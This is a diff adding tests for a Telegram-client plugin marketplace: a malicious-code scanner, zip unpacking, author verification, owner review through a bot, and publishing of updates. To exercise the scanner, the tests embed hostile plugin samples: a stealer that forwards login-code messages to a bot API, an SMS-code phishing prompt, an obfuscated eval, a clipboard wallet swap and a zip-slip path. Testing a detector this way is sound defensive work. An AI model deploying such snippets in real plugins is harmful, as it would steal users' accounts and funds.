@@ -4,7 +4,8 @@ import { webcrypto as crypto, createHash } from 'node:crypto';
 import { accountHash, ipTag } from './stats.js';
 import { checkBadgePayments, lockOf } from './badges.js';
 import { cleanBrightness, cleanNfts, cleanNumber, cleanPatch, cleanUsernames, inspectMedia, network } from './profile.js';
-import worker, { Profiles, base64urlEncode, describe, sendToBark, chatTarget, seenUpdate, alreadySeen, Presence, activityId, Stats, stashRecord } from './worker.js';
+import { scanPlugin, unpackPlugin, compareVersions } from './scan.js';
+import worker, { Market, Profiles, base64urlEncode, describe, sendToBark, chatTarget, seenUpdate, alreadySeen, Presence, activityId, Stats, stashRecord } from './worker.js';
 
 const cacheStore = new Map();
 globalThis.caches = { default: {
@@ -892,6 +893,7 @@ async function testModerationSignature() {
 }
 
 await testProfiles();
+await testMarket();
 async function testProfiles() {
   const memory = () => {
     const data = new Map();
@@ -1617,6 +1619,194 @@ async function testProfiles() {
     assert.equal(cleanPatch({ __proto__: { hideReal: true } }).error, 'bad_request');
     assert.equal(globalStore.get('bytes'), [...objects.keys()].filter((name) => name.startsWith('media-')).reduce((sum, name) => sum + [...objects.get(name).state.storage.data].filter(([key]) => key.startsWith('m:')).reduce((part, [, meta]) => part + meta.size, 0), 0), 'The media budget still matches the stored bytes');
     console.log('push relay: fake statuses, hidden real gifts, one unique +888 number and NFT holder lookups stay consistent on every path');
+  } finally {
+    globalThis.fetch = real;
+  }
+}
+
+async function testMarket() {
+  const memory = () => {
+    const data = new Map();
+    return {
+      data,
+      async get(k) { return Array.isArray(k) ? new Map(k.filter((key) => data.has(key)).map((key) => [key, data.get(key)])) : data.get(k); },
+      async put(k, v) { if (typeof k === 'object') { for (const [key, value] of Object.entries(k)) data.set(key, value); } else { data.set(k, v); } },
+      async delete(keys) { for (const k of [].concat(keys)) data.delete(k); },
+      async list({ prefix, startAfter, limit }) { const all = [...data].filter(([k]) => k.startsWith(prefix) && (!startAfter || k > startAfter)).sort(([a], [b]) => (a < b ? -1 : a > b ? 1 : 0)); return new Map(limit ? all.slice(0, limit) : all); },
+    };
+  };
+  const unpack = (text, name) => unpackPlugin(enc.encode(text), name || 'p.js');
+  const benign = '// @name Echo Tools\n// @id echo-tools\n// @version 1.0\n// @description Adds a menu item that copies text\n// @permissions ui.inject\nwg.menu.addItem({ id: "copy", title: "Copy" });\nwg.on("copy", function (p) { wg.ui.toast("copied"); });\n';
+  const clean = scanPlugin(await unpack(benign));
+  assert.equal(clean.verdict, 'clean', JSON.stringify(clean.findings));
+  const stealer = '// @name Helper\n// @id helper\n// @permissions messages.read, network.client\n// @domains api.telegram.org\nwg.events.on("message.new", function (m) { if (m.peerId == 777000) { wg.net.fetch("https://api.telegram.org/bot1:abc/sendMessage", { method: "POST", body: { text: m.text } }); } });\n';
+  const stolen = scanPlugin(await unpack(stealer));
+  assert.equal(stolen.verdict, 'danger', 'Reading 777000 and posting to a bot is dangerous');
+  assert.ok(stolen.findings.some((item) => item.code === 'service_chat') && stolen.findings.some((item) => item.code === 'exfil_host'));
+  const phish = scanPlugin(await unpack('// @name Prize\n// @permissions ui.inject, messages.send\nwg.ui.prompt("Введите код из SMS").then(function (c) { wg.messages.send("123456789", c); });\n'));
+  assert.equal(phish.verdict, 'danger', 'A prompt for a login code is phishing');
+  assert.ok(phish.findings.some((item) => item.code === 'phishing_prompt'));
+  assert.equal(scanPlugin(await unpack('// @name X\nvar _0x3fa2=["a"];eval(_0x3fa2[0]);\n')).verdict, 'danger', 'Obfuscated eval is dangerous');
+  assert.equal(scanPlugin(await unpack('// @name Wallet\nwg.system.clipboardSet("UQBvW8Z5huBkMJYdnfAEM5JqTNkuWX3diqYENkWsIL0XggGG");\n')).verdict, 'danger', 'A wallet in the clipboard is a swap');
+  assert.equal(scanPlugin(await unpack('// @name Comment\n// eval( is fine inside a comment\nwg.ui.toast("hi");\n')).findings.some((item) => item.code === 'dynamic_code'), false, 'Comments are ignored');
+  assert.equal(compareVersions('1.10', '1.9'), 1);
+  assert.equal(compareVersions('2.0', '2.0.0'), 0);
+  const zipOf = async (entries) => {
+    const locals = [];
+    const centrals = [];
+    let offset = 0;
+    const le16 = (n) => new Uint8Array([n & 255, (n >> 8) & 255]);
+    const le32 = (n) => new Uint8Array([n & 255, (n >> 8) & 255, (n >> 16) & 255, (n >>> 24) & 255]);
+    for (const [name, text, deflate] of entries) {
+      const raw = enc.encode(text);
+      const data = deflate ? new Uint8Array(await new Response(new Blob([raw]).stream().pipeThrough(new CompressionStream('deflate-raw'))).arrayBuffer()) : raw;
+      const nameBytes = enc.encode(name);
+      const local = concat(le32(0x04034b50), le16(20), le16(0), le16(deflate ? 8 : 0), le32(0), le32(0), le32(data.length), le32(raw.length), le16(nameBytes.length), le16(0), nameBytes, data);
+      centrals.push(concat(le32(0x02014b50), le16(20), le16(20), le16(0), le16(deflate ? 8 : 0), le32(0), le32(0), le32(data.length), le32(raw.length), le16(nameBytes.length), le16(0), le16(0), le16(0), le16(0), le32(0), le32(offset), nameBytes));
+      locals.push(local);
+      offset += local.length;
+    }
+    const central = concat(...centrals);
+    return concat(...locals, central, le32(0x06054b50), le16(0), le16(0), le16(entries.length), le16(entries.length), le32(central.length), le32(offset), le16(0));
+  };
+  const zipped = await unpackPlugin(await zipOf([['pkg/plugin.json', JSON.stringify({ id: 'zip-demo', name: 'Zip Demo', version: '2.1', permissions: ['ui.inject'] }), false], ['pkg/main.js', 'wg.ui.toast("zip");\n', true]]), 'demo.zip');
+  assert.equal(zipped.info.id, 'zip-demo', 'Zip packages are unpacked, with one top folder');
+  assert.equal(zipped.info.version, '2.1');
+  assert.equal(zipped.files[0].text, 'wg.ui.toast("zip");\n', 'Deflated entries are inflated');
+  assert.equal((await unpackPlugin(await zipOf([['../evil.js', 'x', false]]), 'a.zip')).error, 'bad_path', 'Zip slip is refused');
+
+  const statsObject = new Stats({ storage: memory() });
+  const STATS = { idFromName(name) { return name; }, get() { return { fetch: (url, init) => statsObject.fetch(new Request(url, init)) }; } };
+  const objects = new Map();
+  const PROFILES = { idFromName(name) { return name; }, get(name) { if (!objects.has(name)) objects.set(name, new Profiles({ storage: memory() })); const object = objects.get(name); return { fetch: (url, init) => object.fetch(new Request(url, init)) }; } };
+  const marketObject = new Market({ storage: memory() });
+  const MARKET = { idFromName(name) { return name; }, get() { return { fetch: (url, init) => marketObject.fetch(new Request(url, init)) }; } };
+  const env = { STATS, PROFILES, MARKET, STATS_TOKEN: 'admin-token', REPORT_BOT_TOKEN: '1:a', REPORT_CHAT_ID: '1272887902', REPORT_WEBHOOK_SECRET: 'h' };
+  const telegram = [];
+  const real = globalThis.fetch;
+  globalThis.fetch = async (url, init) => {
+    const body = init && init.body;
+    const method = String(url).split('/').pop();
+    telegram.push({ method, form: body instanceof FormData ? body : null, json: typeof body === 'string' ? JSON.parse(body) : null });
+    if (method === 'getMe') {
+      return new Response(JSON.stringify({ ok: true, result: { id: 1, is_bot: true, username: 'AyuRelayBot' } }));
+    }
+    return new Response('{"ok":true}');
+  };
+  cacheStore.clear();
+  try {
+    const secret = 'm'.repeat(32);
+    const auth = (id) => ({ 'x-ayugram-id': id, 'x-ayugram-secret': secret, 'cf-connecting-ip': '198.51.100.' + (Number(id) % 200) });
+    const call = (path, init, host) => worker.fetch(new Request('https://' + (host || 'marketplace.mapixdev.com') + path, init), env);
+    const hook = (update) => worker.fetch(new Request('https://relay.example/tg/hook', { method: 'POST', headers: { 'x-telegram-bot-api-secret-token': 'h' }, body: JSON.stringify(update) }), env);
+    const verify = async (id) => {
+      const started = await (await worker.fetch(new Request('https://relay.example/profile/verify/start', { method: 'POST', headers: auth(id) }), env)).json();
+      await hook({ update_id: 1, message: { message_id: 10, from: { id: Number(id), is_bot: false, first_name: 'U' }, chat: { id: Number(id), type: 'private' }, text: '/start pv_' + started.nonce } });
+      await hook({ update_id: 2, callback_query: { id: 'cq', from: { id: Number(id), is_bot: false }, data: 'pv:' + started.nonce, message: { message_id: 11, chat: { id: Number(id), type: 'private' } } } });
+    };
+    const png = concat(new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), new Uint8Array([0, 0, 0, 13]), enc.encode('IHDR'), new Uint8Array([0, 0, 2, 128, 0, 0, 1, 224]), new Uint8Array([8, 6, 0, 0, 0]), new Uint8Array(4));
+    const submit = async (id, source, meta, media, name) => {
+      const form = new FormData();
+      form.append('meta', JSON.stringify(meta || {}));
+      form.append('file', new Blob([enc.encode(source)]), name || 'plugin.js');
+      for (const item of media === undefined ? [png] : media) {
+        form.append('media', new Blob([item]), 'shot.png');
+      }
+      const request = new Request('https://marketplace.mapixdev.com/api/submit', { method: 'POST', headers: auth(id), body: form });
+      const bytes = new Uint8Array(await request.arrayBuffer());
+      const response = await call('/api/submit', { method: 'POST', headers: { ...auth(id), 'content-type': request.headers.get('content-type'), 'content-length': String(bytes.length) }, body: bytes });
+      return { status: response.status, body: await response.json() };
+    };
+    const press = async (data) => {
+      telegram.length = 0;
+      await hook({ update_id: 3, callback_query: { id: 'q', from: { id: 1272887902 }, data, message: { message_id: 50, chat: { id: 1272887902 } } } });
+      return telegram;
+    };
+    const meta = { name: 'Echo <Tools>', description: 'Adds a copy item to the message menu', about: 'Long story <script>alert(1)</script>', author: { name: 'Dev', username: 'dev_user' } };
+
+    assert.equal((await submit('3001', benign, meta)).status, 403, 'Only Telegram-verified authors can submit');
+    await verify('3001');
+    assert.equal((await submit('3001', benign, meta, [])).body.error, 'media_required', 'A new plugin needs a photo or video');
+    assert.equal((await submit('3001', benign, { ...meta, description: 'short' })).body.error, 'bad_description');
+    telegram.length = 0;
+    const first = await submit('3001', benign, meta);
+    assert.equal(first.status, 200, JSON.stringify(first.body));
+    assert.equal(first.body.submission.status, 'pending', 'A clean plugin waits for the owner');
+    const adminMessage = telegram.find((item) => item.method === 'sendMessage' && item.json.chat_id === '1272887902');
+    assert.ok(adminMessage && adminMessage.json.text.includes('🟢'), 'The owner gets the scan result');
+    assert.equal(adminMessage.json.reply_markup.inline_keyboard[0][0].callback_data, 'MA:' + first.body.submission.sid);
+    assert.ok(telegram.some((item) => item.method === 'sendDocument'), 'and the plugin file itself');
+    assert.ok(telegram.some((item) => item.method === 'sendPhoto'), 'and the demo');
+    assert.deepEqual((await (await call('/api/plugins')).json()).items, [], 'Nothing is public before approval');
+
+    await press('MA:' + first.body.submission.sid);
+    assert.ok(telegram.some((item) => item.method === 'sendMessage' && item.json.chat_id === '3001' && item.json.text.includes('опубликован')), 'The author is told');
+    const list = (await (await call('/api/plugins')).json()).items;
+    assert.equal(list.length, 1);
+    assert.equal(list[0].version, '1.0');
+    assert.equal(list[0].author.username, 'dev_user');
+    assert.equal(list[0].media[0].url.startsWith('https://marketplace.mapixdev.com/m/'), true);
+    assert.equal((await call(new URL(list[0].media[0].url).pathname)).status, 200, 'Demo media is served');
+    const relayList = (await (await call('/market/api/plugins', {}, 'relay.mapixdev.com')).json()).items;
+    assert.equal(relayList[0].downloadUrl, 'https://relay.mapixdev.com/market/api/plugins/echo-tools/download', 'The relay host serves the same marketplace under /market');
+    const download = await call('/api/plugins/echo-tools/download', { headers: { 'cf-connecting-ip': '192.0.2.5' } });
+    assert.equal(await download.text(), benign);
+    assert.equal(download.headers.get('x-plugin-sha256'), createHash('sha256').update(benign).digest('hex'));
+    assert.equal(download.headers.get('content-disposition').startsWith('attachment'), true);
+    await call('/api/plugins/echo-tools/download', { headers: { 'cf-connecting-ip': '192.0.2.5' } });
+    assert.equal((await (await call('/api/plugins/echo-tools')).json()).plugin.downloads, 1, 'Repeat downloads from one network count once a day');
+    const html = await (await call('/p/echo-tools')).text();
+    assert.ok(html.includes('Echo &lt;Tools&gt;') && !html.includes('<script>alert'), 'Pages escape everything');
+    assert.ok((await (await call('/')).text()).includes('/p/echo-tools'));
+    assert.ok((await (await call('/u/3001')).text()).includes('dev_user'));
+
+    assert.equal((await submit('3001', benign, meta)).body.error, 'version_not_newer', 'An update needs a newer version');
+    const update = await submit('3001', benign.replace('@version 1.0', '@version 1.1'), { ...meta, changelog: 'Faster' }, []);
+    assert.equal(update.status, 200);
+    assert.equal(update.body.submission.kind, 'update');
+    assert.equal((await (await call('/api/plugins/echo-tools')).json()).plugin.version, '1.0', 'Updates stay hidden until approved');
+    await press('MA:' + update.body.submission.sid);
+    const updated = (await (await call('/api/plugins/echo-tools')).json()).plugin;
+    assert.equal(updated.version, '1.1');
+    assert.equal(updated.changelog, 'Faster');
+    assert.equal(updated.media.length, 1, 'An update without media keeps the old demo');
+    assert.equal(updated.history[0].version, '1.0');
+
+    await verify('3002');
+    assert.equal((await submit('3002', benign.replace('@version 1.0', '@version 9.0'), meta)).body.error, 'slug_taken', 'Nobody else can push updates to a plugin');
+
+    telegram.length = 0;
+    const bad = await submit('3002', stealer.replace('// @name Helper', '// @name Helper\n// @description Helps with your messages a lot'), { description: 'Helps with your messages a lot' });
+    assert.equal(bad.body.submission.status, 'rejected', 'Dangerous code is rejected automatically');
+    const autoMessage = telegram.find((item) => item.method === 'sendMessage' && item.json.chat_id === '1272887902');
+    assert.ok(autoMessage.json.text.includes('🔴') && autoMessage.json.reply_markup.inline_keyboard[0][0].text.includes('Всё равно'), 'The owner can still override it');
+    assert.ok(telegram.some((item) => item.method === 'sendMessage' && item.json.chat_id === '3002'), 'and the author learns why');
+
+    const pending = await submit('3002', benign.replace('echo-tools', 'other-tool').replace('Echo Tools', 'Other Tool'), { description: 'Another useful little plugin' });
+    await press('MR:' + pending.body.submission.sid);
+    assert.equal(telegram.find((item) => item.method === 'editMessageText').json.reply_markup.inline_keyboard[0][0].callback_data, 'MR:' + pending.body.submission.sid + ':malware', 'Rejecting asks for a reason');
+    await press('MR:' + pending.body.submission.sid + ':broken');
+    assert.ok(telegram.some((item) => item.method === 'sendMessage' && item.json.chat_id === '3002' && item.json.text.includes('Плагин не работает')));
+    const mine = await (await call('/api/mine', { headers: auth('3002') })).json();
+    assert.ok(mine.submissions.some((item) => item.status === 'rejected' && item.reason === 'Плагин не работает'), 'Authors see their submissions and reasons');
+
+    const scanned = await (await call('/api/scan?name=x.js', { method: 'POST', body: enc.encode(stealer) })).json();
+    assert.equal(scanned.scan.verdict, 'danger', 'Any plugin can be scanned before installing');
+
+    telegram.length = 0;
+    await hook({ update_id: 4, message: { message_id: 60, from: { id: 1272887902 }, chat: { id: 1272887902 }, text: '/market' } });
+    assert.ok(telegram.some((item) => item.method === 'sendMessage' && item.json.text.includes('Заявок на проверку нет')));
+
+    await press('MH:echo-tools');
+    assert.deepEqual((await (await call('/api/plugins')).json()).items, [], 'Hidden plugins leave the list');
+    await press('MS:echo-tools');
+    assert.equal((await (await call('/api/plugins')).json()).items.length, 1);
+    await press('MX:echo-tools');
+    assert.equal((await call('/api/plugins/echo-tools')).status, 404);
+    await marketObject.fetch(new Request('https://market.ayugram.invalid/sweep', { method: 'POST', body: JSON.stringify({}) }));
+    const sizes = [...marketObject.state.storage.data].filter(([key]) => key.startsWith('bm:')).reduce((sum, [, value]) => sum + value.size, 0);
+    assert.equal(marketObject.state.storage.data.get('bytes'), sizes, 'Stored bytes match the blobs that are left');
+    console.log('push relay: plugin marketplace checks code, waits for the owner, publishes updates only after review');
   } finally {
     globalThis.fetch = real;
   }
